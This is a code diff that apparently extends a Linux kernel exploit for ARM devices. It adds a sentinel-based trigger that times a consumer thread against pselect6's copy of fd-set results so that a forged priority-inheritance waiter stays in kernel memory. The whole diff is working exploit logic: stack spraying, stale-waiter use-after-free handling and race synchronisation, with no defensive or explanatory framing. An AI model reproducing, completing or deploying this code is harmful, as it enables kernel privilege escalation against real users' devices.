@@ -10,6 +10,12 @@
 #ifndef SLIDE_PSELECT_RESULT_ROUTE
 #define SLIDE_PSELECT_RESULT_ROUTE 0
 #endif
+#ifndef SLIDE_RESULT_COPY_TRIGGER
+#define SLIDE_RESULT_COPY_TRIGGER 0
+#endif
+#if SLIDE_RESULT_COPY_TRIGGER && !SLIDE_PSELECT_RESULT_ROUTE
+#error "result-copy trigger requires the result fd-set route"
+#endif
 #if SLIDE_PSELECT_RESULT_ROUTE && defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
 #error "result fd-set route runs after pselect returns"
 #endif
@@ -60,6 +66,12 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_pselect_write_window;
+#if SLIDE_RESULT_COPY_TRIGGER
+static atomic_uintptr_t slide_result_sentinel_word;
+static atomic_uint_fast64_t slide_result_sentinel_mask;
+static atomic_int slide_result_syscall_returned;
+static atomic_int slide_result_seen_after_return;
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static atomic_uint_fast64_t slide_pselect_started_ns;
 static int slide_pselect_production_stack;
@@ -390,6 +402,48 @@ void slide_pselect_stack_copy(void) {
   }
 #endif
   open_slide_selected_fds(&in, &out, &ex, high_read);
+#if SLIDE_RESULT_COPY_TRIGGER
+  /*
+   * T870's stale legacy waiter begins at result qword 1. Qword 0 is therefore
+   * free for a readiness sentinel. Preserve fd 63 because it can belong to
+   * the physical pipe oracle, replace it temporarily with the empty pipe's
+   * read end, and select it only in the input mask. core_sys_select() clears
+   * this bit when it copies res_in to userspace, while the complete fake
+   * waiter is already present in the adjacent kernel result words.
+   */
+  const int sentinel_fd = 63;
+  int sentinel_backup = fcntl(sentinel_fd, F_DUPFD_CLOEXEC,
+                              slide_pselect_nfds + 32);
+  int sentinel_was_open = sentinel_backup >= 0;
+  if (!sentinel_was_open && errno != EBADF) {
+    pr_error("slide result-copy sentinel backup errno=%d\n", errno);
+    close(high_read);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+  if (dup2(pipefd[0], sentinel_fd) < 0) {
+    pr_error("slide result-copy sentinel dup2 errno=%d\n", errno);
+    if (sentinel_was_open) {
+      close(sentinel_backup);
+    }
+    close(high_read);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+  FD_SET(sentinel_fd, &in);
+  atomic_store(&slide_result_sentinel_word, (uintptr_t)&in);
+  atomic_store(&slide_result_sentinel_mask, 1ULL << sentinel_fd);
+  atomic_store(&slide_result_syscall_returned, 0);
+  atomic_store(&slide_result_seen_after_return, -1);
+#endif
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -428,10 +482,15 @@ void slide_pselect_stack_copy(void) {
   }
 #if !SLIDE_PSELECT_RESULT_ROUTE
   atomic_store(&slide_consume_go, 1);
+#elif SLIDE_RESULT_COPY_TRIGGER
+  atomic_store(&slide_consume_go, 1);
 #endif
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
+#if SLIDE_RESULT_COPY_TRIGGER
+  atomic_store(&slide_result_syscall_returned, 1);
+#endif
   int saved_errno = errno;
 #if SLIDE_PSELECT_RESULT_ROUTE
   int result_ready =
@@ -444,7 +503,9 @@ void slide_pselect_stack_copy(void) {
      * fd-sets. Keep this thread out of the kernel while the consumer changes
      * its priority and follows the stale PI waiter.
      */
+#if !SLIDE_RESULT_COPY_TRIGGER
     atomic_store(&slide_consume_go, 1);
+#endif
     for (size_t spins = 0;
          !atomic_load(&slide_consume_stop) && spins < 100000000ULL;
          spins++) {
@@ -485,6 +546,14 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
+#if SLIDE_RESULT_COPY_TRIGGER
+  pr_info("slide result-copy trigger sentinel_cleared=%d "
+          "seen_after_return=%d syscall_returned=%d\n",
+          !(atomic_load(&slide_result_sentinel_mask) &
+            *(volatile uint64_t *)atomic_load(&slide_result_sentinel_word)),
+          atomic_load(&slide_result_seen_after_return),
+          atomic_load(&slide_result_syscall_returned));
+#endif
 #else
   pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
           "elapsed_usec=%zu "
@@ -502,6 +571,19 @@ void slide_pselect_stack_copy(void) {
 #endif
   atomic_store(&slide_pselect_write_window,
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+
+#if SLIDE_RESULT_COPY_TRIGGER
+  if (sentinel_was_open) {
+    if (dup2(sentinel_backup, sentinel_fd) < 0) {
+      pr_warning("slide result-copy sentinel restore errno=%d\n", errno);
+    }
+    close(sentinel_backup);
+  } else {
+    close(sentinel_fd);
+  }
+  atomic_store(&slide_result_sentinel_word, 0);
+  atomic_store(&slide_result_sentinel_mask, 0);
+#endif
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -680,6 +762,16 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     char guard_wchan[64] = "<not-read>";
 #endif
     if (seq == 1) {
+#if SLIDE_RESULT_COPY_TRIGGER
+      uintptr_t sentinel_word = atomic_load(&slide_result_sentinel_word);
+      uint64_t sentinel_mask = atomic_load(&slide_result_sentinel_mask);
+      while (atomic_load(&slide_consume_go) == seq && sentinel_word &&
+             (*(volatile uint64_t *)sentinel_word & sentinel_mask)) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      atomic_store(&slide_result_seen_after_return,
+                   atomic_load(&slide_result_syscall_returned));
+#else
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
       ready_ok = slide_wait_for_pselect_blocked(
           tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
@@ -736,6 +828,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
         atomic_store(&slide_consume_stop, 1);
         return NULL;
       }
+#endif
 #endif
     }
 #else
